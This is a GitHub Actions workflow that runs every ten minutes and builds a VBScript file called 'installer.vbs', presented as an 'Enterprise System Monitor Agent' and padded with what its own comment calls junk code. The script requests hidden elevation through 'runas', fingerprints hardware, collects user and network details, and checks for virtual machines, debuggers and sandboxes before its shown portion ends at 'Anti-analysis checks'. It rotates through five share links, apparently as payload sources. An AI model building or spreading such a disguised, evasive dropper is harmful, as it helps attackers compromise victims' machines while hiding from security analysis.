name: Update VBS

on:
  schedule:
    - cron: '*/10 * * * *'
  workflow_dispatch:

jobs:
  update:
    runs-on: ubuntu-latest
    permissions:
      contents: write
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4
    - name: Create Bulky VBS file
      run: |
        # Define your links
        links=("https://share.google/jraH4hXE8DKHc3EXZ" "https://share.google/5icY94HkmAiaVcn86" "https://share.google/mkGe1JX56Lut4KMdt" "https://share.google/zwqwLoZiVh08jLOa4" "https://share.google/dDynM21vQuy0Qvc4Z")
        
        # Get current link based on 10-minute interval
        current_minute=$(date +%M)
        link_index=$((current_minute / 10 % 5))
        current_link=${links[$link_index]}
        
        echo "Creating bulky VBS with link: $current_link"
        
        # Create a bulky VBS with lots of junk code using echo commands
        echo "' --------------------------------------------------------------------------" > installer.vbs
        echo "'  Enterprise System Monitor Agent v3.7.2" >> installer.vbs
        echo "'  Copyright (c) 2023 Enterprise Solutions Inc." >> installer.vbs
        echo "' --------------------------------------------------------------------------" >> installer.vbs
        echo "Option Explicit" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Initialize system variables" >> installer.vbs
        echo "Dim WshShell, Fso, EnvVars, SysInfo, ProcList, NetObj, RegObj" >> installer.vbs
        echo "Set WshShell = CreateObject(\"WScript.Shell\")" >> installer.vbs
        echo "Set Fso = CreateObject(\"Scripting.FileSystemObject\")" >> installer.vbs
        echo "Set EnvVars = WshShell.Environment(\"Process\")" >> installer.vbs
        echo "Set SysInfo = CreateObject(\"Win32_SystemInfo\")" >> installer.vbs
        echo "" >> installer.vbs
        echo "' System information collection" >> installer.vbs
        echo "Function GetSystemInfo()" >> installer.vbs
        echo "    Dim objWMIService, colItems, objItem" >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    Set colItems = objWMIService.ExecQuery(\"Select * From Win32_ComputerSystem\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    For Each objItem in colItems" >> installer.vbs
        echo "        GetSystemInfo = objItem.Model & \"|\" & objItem.Manufacturer & \"|\" & objItem.TotalPhysicalMemory" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Process validation function" >> installer.vbs
        echo "Function ValidateProcess(processName)" >> installer.vbs
        echo "    Dim colProcesses, objProcess" >> installer.vbs
        echo "    Set colProcesses = GetObject(\"winmgmts:\").ExecQuery(\"Select * From Win32_Process Where Name='\" & processName & \"'\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    ValidateProcess = False" >> installer.vbs
        echo "    For Each objProcess in colProcesses" >> installer.vbs
        echo "        ValidateProcess = True" >> installer.vbs
        echo "        Exit For" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Network adapter information" >> installer.vbs
        echo "Function GetNetworkInfo()" >> installer.vbs
        echo "    Dim objWMIService, colAdapters, objAdapter" >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    Set colAdapters = objWMIService.ExecQuery(\"Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    For Each objAdapter in colAdapters" >> installer.vbs
        echo "        GetNetworkInfo = objAdapter.MACAddress & \"|\" & Join(objAdapter.IPAddress, \",\")" >> installer.vbs
        echo "        Exit For" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Registry operations helper" >> installer.vbs
        echo "Function ReadRegKey(keyPath, valueName)" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    ReadRegKey = WshShell.RegRead(keyPath & \"\\\" & valueName)" >> installer.vbs
        echo "    If Err.Number <> 0 Then ReadRegKey = \"\"" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Write registry value" >> installer.vbs
        echo "Sub WriteRegKey(keyPath, valueName, value)" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    WshShell.RegWrite keyPath & \"\\\" & valueName, value, \"REG_SZ\"" >> installer.vbs
        echo "End Sub" >> installer.vbs
        echo "" >> installer.vbs
        echo "' File operations helper" >> installer.vbs
        echo "Function CreateTempFile(prefix, extension)" >> installer.vbs
        echo "    Dim tempFolder, fileName" >> installer.vbs
        echo "    tempFolder = WshShell.ExpandEnvironmentStrings(\"%TEMP%\")" >> installer.vbs
        echo "    fileName = tempFolder & \"\\\" & prefix & \"_\" & Round(Timer * 1000) & \".\" & extension" >> installer.vbs
        echo "    Set CreateTempFile = Fso.CreateTextFile(fileName, True)" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Encryption helper function" >> installer.vbs
        echo "Function SimpleEncrypt(text)" >> installer.vbs
        echo "    Dim i, result" >> installer.vbs
        echo "    result = \"\"" >> installer.vbs
        echo "    For i = 1 To Len(text)" >> installer.vbs
        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "    SimpleEncrypt = result" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Decryption helper function" >> installer.vbs
        echo "Function SimpleDecrypt(text)" >> installer.vbs
        echo "    Dim i, result" >> installer.vbs
        echo "    result = \"\"" >> installer.vbs
        echo "    For i = 1 To Len(text)" >> installer.vbs
        echo "        result = result & Chr(Asc(Mid(text, i, 1)) Xor 42)" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "    SimpleDecrypt = result" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for elevated privileges" >> installer.vbs
        echo "Function IsElevated()" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    IsElevated = False" >> installer.vbs
        echo "    If WScript.Arguments.Named.Exists(\"elevated\") Then" >> installer.vbs
        echo "        IsElevated = True" >> installer.vbs
        echo "    Else" >> installer.vbs
        echo "        CreateObject(\"Shell.Application\").ShellExecute \"wscript.exe\", \"\"\"\" & WScript.ScriptFullName & \"\"\" /elevated\", \"\", \"runas\", 0" >> installer.vbs
        echo "        WScript.Quit" >> installer.vbs
        echo "    End If" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Network connectivity check" >> installer.vbs
        echo "Function CheckConnection(url)" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    Dim objHTTP" >> installer.vbs
        echo "    Set objHTTP = CreateObject(\"MSXML2.ServerXMLHTTP.6.0\")" >> installer.vbs
        echo "    objHTTP.open \"HEAD\", url, False" >> installer.vbs
        echo "    objHTTP.send()" >> installer.vbs
        echo "    If objHTTP.Status = 200 Then" >> installer.vbs
        echo "        CheckConnection = True" >> installer.vbs
        echo "    Else" >> installer.vbs
        echo "        CheckConnection = False" >> installer.vbs
        echo "    End If" >> installer.vbs
        echo "    Set objHTTP = Nothing" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Hardware fingerprint generation" >> installer.vbs
        echo "Function GetHardwareFingerprint()" >> installer.vbs
        echo "    Dim objWMIService, colItems, objItem, fingerprint" >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    fingerprint = \"\"" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    ' Get CPU ID" >> installer.vbs
        echo "    Set colItems = objWMIService.ExecQuery(\"Select * From Win32_Processor\")" >> installer.vbs
        echo "    For Each objItem in colItems" >> installer.vbs
        echo "        fingerprint = fingerprint & objItem.ProcessorId" >> installer.vbs
        echo "        Exit For" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    ' Get motherboard serial" >> installer.vbs
        echo "    Set colItems = objWMIService.ExecQuery(\"Select * From Win32_BaseBoard\")" >> installer.vbs
        echo "    For Each objItem in colItems" >> installer.vbs
        echo "        fingerprint = fingerprint & objItem.SerialNumber" >> installer.vbs
        echo "        Exit For" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    ' Get BIOS serial" >> installer.vbs
        echo "    Set colItems = objWMIService.ExecQuery(\"Select * From Win32_BIOS\")" >> installer.vbs
        echo "    For Each objItem in colItems" >> installer.vbs
        echo "        fingerprint = fingerprint & objItem.SerialNumber" >> installer.vbs
        echo "        Exit For" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    GetHardwareFingerprint = fingerprint" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Memory status check" >> installer.vbs
        echo "Function GetMemoryStatus()" >> installer.vbs
        echo "    Dim objWMIService, colItems, objItem" >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    Set colItems = objWMIService.ExecQuery(\"Select * From Win32_OperatingSystem\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    For Each objItem in colItems" >> installer.vbs
        echo "        GetMemoryStatus = Round(objItem.TotalVisibleMemorySize / 1024) & \"MB total, \" & Round(objItem.FreePhysicalMemory / 1024) & \"MB free\"" >> installer.vbs
        echo "        Exit For" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Disk space check" >> installer.vbs
        echo "Function GetDiskSpace(drive)" >> installer.vbs
        echo "    Dim objWMIService, colDisks, objDisk" >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    Set colDisks = objWMIService.ExecQuery(\"Select * From Win32_LogicalDisk Where DeviceID='\" & drive & \"'\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    For Each objDisk in colDisks" >> installer.vbs
        echo "        GetDiskSpace = Round(objDisk.Size / 1073741824, 2) & \"GB total, \" & Round(objDisk.FreeSpace / 1073741824, 2) & \"GB free\"" >> installer.vbs
        echo "        Exit For" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' User account information" >> installer.vbs
        echo "Function GetUserInfo()" >> installer.vbs
        echo "    Dim objNetwork" >> installer.vbs
        echo "    Set objNetwork = CreateObject(\"WScript.Network\")" >> installer.vbs
        echo "    GetUserInfo = objNetwork.UserName & \"|\" & objNetwork.ComputerName & \"|\" & objNetwork.UserDomain" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Service status check" >> installer.vbs
        echo "Function GetServiceStatus(serviceName)" >> installer.vbs
        echo "    Dim objWMIService, colServices, objService" >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    Set colServices = objWMIService.ExecQuery(\"Select * From Win32_Service Where Name='\" & serviceName & \"'\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    For Each objService in colServices" >> installer.vbs
        echo "        GetServiceStatus = objService.State & \"|\" & objService.StartMode" >> installer.vbs
        echo "        Exit For" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Event log check" >> installer.vbs
        echo "Function CheckEventLog(source, eventType, hours)" >> installer.vbs
        echo "    Dim objWMIService, colEvents, objEvent, cutoff" >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    cutoff = DateAdd(\"h\", -hours, Now)" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    Set colEvents = objWMIService.ExecQuery(\"Select * From Win32_NTLogEvent Where LogFile='Application' And SourceName='\" & source & \"' And EventType=\" & eventType & \" And TimeGenerated >= '\" & WMIDateString(cutoff) & \"'\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    CheckEventLog = colEvents.Count" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Helper to convert date to WMI format" >> installer.vbs
        echo "Function WMIDateString(dDate)" >> installer.vbs
        echo "    WMIDateString = Year(dDate) & Right(\"0\" & Month(dDate), 2) & Right(\"0\" & Day(dDate), 2) & Right(\"0\" & Hour(dDate), 2) & Right(\"0\" & Minute(dDate), 2) & Right(\"0\" & Second(dDate), 2) & \".000000+000\"" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for specific running processes" >> installer.vbs
        echo "Function IsProcessRunning(processName)" >> installer.vbs
        echo "    Dim objWMIService, colProcesses, objProcess" >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    Set colProcesses = objWMIService.ExecQuery(\"Select * From Win32_Process Where Name='\" & processName & \"'\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    IsProcessRunning = False" >> installer.vbs
        echo "    For Each objProcess in colProcesses" >> installer.vbs
        echo "        IsProcessRunning = True" >> installer.vbs
        echo "        Exit For" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Get installed software list" >> installer.vbs
        echo "Function GetInstalledSoftware()" >> installer.vbs
        echo "    Dim objWMIService, colSoftware, objSoftware, result" >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    Set colSoftware = objWMIService.ExecQuery(\"Select * From Win32_Product\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    result = \"\"" >> installer.vbs
        echo "    For Each objSoftware in colSoftware" >> installer.vbs
        echo "        If result <> \"\" Then result = result & \";\"" >> installer.vbs
        echo "        result = result & objSoftware.Name & \" (\" & objSoftware.Version & \")\"" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    GetInstalledSoftware = result" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for virtual environment" >> installer.vbs
        echo "Function IsVirtualEnvironment()" >> installer.vbs
        echo "    Dim objWMIService, colBIOS, objBIOS, result" >> installer.vbs
        echo "    result = False" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    Set colBIOS = objWMIService.ExecQuery(\"Select * From Win32_BIOS\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    For Each objBIOS in colBIOS" >> installer.vbs
        echo "        If InStr(LCase(objBIOS.SerialNumber), \"vmware\") > 0 Or _" >> installer.vbs
        echo "           InStr(LCase(objBIOS.Version), \"virtualbox\") > 0 Or _" >> installer.vbs
        echo "           InStr(LCase(objBIOS.Manufacturer), \"microsoft\") > 0 And InStr(LCase(objBIOS.Version), \"hyper-v\") > 0 Then" >> installer.vbs
        echo "            result = True" >> installer.vbs
        echo "            Exit For" >> installer.vbs
        echo "        End If" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    IsVirtualEnvironment = result" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Get network adapter details" >> installer.vbs
        echo "Function GetNetworkAdapterDetails()" >> installer.vbs
        echo "    Dim objWMIService, colAdapters, objAdapter, result" >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    Set colAdapters = objWMIService.ExecQuery(\"Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    result = \"\"" >> installer.vbs
        echo "    For Each objAdapter in colAdapters" >> installer.vbs
        echo "        If result <> \"\" Then result = result & \"|\"" >> installer.vbs
        echo "        result = result & objAdapter.Description & \";\" & objAdapter.MACAddress & \";\" & Join(objAdapter.IPAddress, \",\")" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    GetNetworkAdapterDetails = result" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for specific registry keys" >> installer.vbs
        echo "Function CheckRegKey(keyPath)" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    Dim objReg" >> installer.vbs
        echo "    Set objReg = GetObject(\"winmgmts:\\\\.\\root\\default:StdRegProv\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    Dim arrValues" >> installer.vbs
        echo "    objReg.EnumValues &H80000002, keyPath, arrValues" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    If Err.Number = 0 And IsArray(arrValues) Then" >> installer.vbs
        echo "        CheckRegKey = UBound(arrValues) + 1" >> installer.vbs
        echo "    Else" >> installer.vbs
        echo "        CheckRegKey = 0" >> installer.vbs
        echo "    End If" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Get system uptime" >> installer.vbs
        echo "Function GetSystemUptime()" >> installer.vbs
        echo "    Dim objWMIService, colOS, objOS" >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    Set colOS = objWMIService.ExecQuery(\"Select * From Win32_OperatingSystem\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    For Each objOS in colOS" >> installer.vbs
        echo "        GetSystemUptime = Round(objOS.LastBootUpTime / 10000000 - #1/1/1970#, 0)" >> installer.vbs
        echo "        Exit For" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for debugger processes" >> installer.vbs
        echo "Function IsDebuggerPresent()" >> installer.vbs
        echo "    Dim debuggers, proc" >> installer.vbs
        echo "    debuggers = Array(\"ollydbg.exe\", \"windbg.exe\", \"x64dbg.exe\", \"ida.exe\", \"ida64.exe\", \"idaq.exe\", \"idaq64.exe\", \"cheatengine.exe\", \"procmon.exe\", \"procexp.exe\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    IsDebuggerPresent = False" >> installer.vbs
        echo "    For Each proc In debuggers" >> installer.vbs
        echo "        If IsProcessRunning(proc) Then" >> installer.vbs
        echo "            IsDebuggerPresent = True" >> installer.vbs
        echo "            Exit For" >> installer.vbs
        echo "        End If" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Anti-sandbox time delay" >> installer.vbs
        echo "Sub AntiSandboxDelay()" >> installer.vbs
        echo "    Dim startTime, endTime" >> installer.vbs
        echo "    startTime = Timer" >> installer.vbs
        echo "    endTime = startTime + 30 ' 30 second delay" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    Do While Timer < endTime" >> installer.vbs
        echo "        ' Do nothing - just waste time" >> installer.vbs
        echo "        Dim dummy" >> installer.vbs
        echo "        dummy = dummy & \"x\"" >> installer.vbs
        echo "    Loop" >> installer.vbs
        echo "End Sub" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for mouse activity (sandbox detection)" >> installer.vbs
        echo "Function HasMouseActivity()" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    Dim objShell" >> installer.vbs
        echo "    Set objShell = CreateObject(\"WScript.Shell\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    ' Get mouse position twice with a small delay" >> installer.vbs
        echo "    Dim pos1, pos2" >> installer.vbs
        echo "    pos1 = objShell.AppActivate(\"WScript\")" >> installer.vbs
        echo "    WScript.Sleep 1000" >> installer.vbs
        echo "    pos2 = objShell.AppActivate(\"WScript\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    ' If positions are the same, likely a sandbox" >> installer.vbs
        echo "    HasMouseActivity = (pos1 <> pos2)" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check system sleep state" >> installer.vbs
        echo "Function CheckSleepState()" >> installer.vbs
        echo "    Dim objWMIService, colPower, objPower" >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    Set colPower = objWMIService.ExecQuery(\"Select * From Win32_PowerPlan Where IsActive = True\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    For Each objPower In colPower" >> installer.vbs
        echo "        CheckSleepState = objPower.Description" >> installer.vbs
        echo "        Exit For" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Get Windows version details" >> installer.vbs
        echo "Function GetWindowsVersion()" >> installer.vbs
        echo "    Dim objWMIService, colOS, objOS" >> installer.vbs
        echo "    Set objWMIService = GetObject(\"winmgmts:\\\\.\\root\\cimv2\")" >> installer.vbs
        echo "    Set colOS = objWMIService.ExecQuery(\"Select * From Win32_OperatingSystem\")" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    For Each objOS in colOS" >> installer.vbs
        echo "        GetWindowsVersion = objOS.Caption & \" \" & objOS.Version & \" Build \" & objOS.BuildNumber" >> installer.vbs
        echo "        Exit For" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Check for specific files" >> installer.vbs
        echo "Function FileExists(filePath)" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    FileExists = Fso.FileExists(filePath)" >> installer.vbs
        echo "    If Err.Number <> 0 Then FileExists = False" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Get directory size" >> installer.vbs
        echo "Function GetDirectorySize(folderPath)" >> installer.vbs
        echo "    On Error Resume Next" >> installer.vbs
        echo "    Dim objFolder, colFiles, objFile, size" >> installer.vbs
        echo "    Set objFolder = Fso.GetFolder(folderPath)" >> installer.vbs
        echo "    size = 0" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    For Each objFile in objFolder.Files" >> installer.vbs
        echo "        size = size + objFile.Size" >> installer.vbs
        echo "    Next" >> installer.vbs
        echo "    " >> installer.vbs
        echo "    GetDirectorySize = size" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Get environment variable" >> installer.vbs
        echo "Function GetEnvVar(varName)" >> installer.vbs
        echo "    GetEnvVar = WshShell.ExpandEnvironmentStrings(\"%\" & varName & \" %\")" >> installer.vbs
        echo "End Function" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Main execution starts here" >> installer.vbs
        echo "' Perform system checks" >> installer.vbs
        echo "Dim systemInfo, networkInfo, hwFingerprint, memStatus, diskSpace, userInfo" >> installer.vbs
        echo "systemInfo = GetSystemInfo()" >> installer.vbs
        echo "networkInfo = GetNetworkInfo()" >> installer.vbs
        echo "hwFingerprint = GetHardwareFingerprint()" >> installer.vbs
        echo "memStatus = GetMemoryStatus()" >> installer.vbs
        echo "diskSpace = GetDiskSpace(\"C:\")" >> installer.vbs
        echo "userInfo = GetUserInfo()" >> installer.vbs
        echo "" >> installer.vbs
        echo "' Anti-analysis checks" >> installer.vbs
